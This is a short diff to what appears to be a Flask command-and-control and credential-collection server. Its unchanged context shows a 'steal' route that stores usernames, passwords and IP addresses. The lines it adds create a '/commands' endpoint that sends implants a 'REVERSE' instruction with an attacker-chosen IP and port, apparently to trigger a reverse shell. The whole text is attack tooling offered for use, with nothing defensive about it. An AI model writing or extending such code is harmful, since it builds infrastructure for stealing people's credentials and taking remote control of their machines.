@@ -90,6 +90,15 @@ def steal():
     insert_data(username, password, ip, timestamp)
     return ""
 
+@app.route('/commands', methods=['POST'])
+def command():
+    type = request.form.get('type')
+    if type=="REVERSE":
+        port = request.form.get('port')
+        ip = request.form.get('ip')
+        return f'REVERSE port={port} ip={ip}'
+    return ""
+
 if __name__ == "__main__":
     create_db()
     app.run(host='0.0.0.0', debug=False)
